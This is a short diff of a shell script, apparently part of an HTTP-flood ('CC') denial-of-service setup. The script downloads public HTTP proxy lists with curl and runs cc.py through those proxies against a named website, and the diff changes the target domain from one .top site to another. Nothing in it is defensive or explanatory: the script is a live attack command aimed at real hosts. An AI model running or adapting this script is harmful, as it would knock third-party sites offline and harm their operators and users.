@@ -7,7 +7,7 @@ cd CC-attack
 git pull
 curl https://jsd.cdn.zzko.cn/gh/TheSpeedX/PROXY-List@master/http.txt -o http.txt
 curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o http.txt
-python3 cc.py -url http://ffwe66.top/ -f http.txt -v 5 -s 30
+python3 cc.py -url http://ffwekk.top/ -f http.txt -v 5 -s 30
 cd ..
 
 echo ""
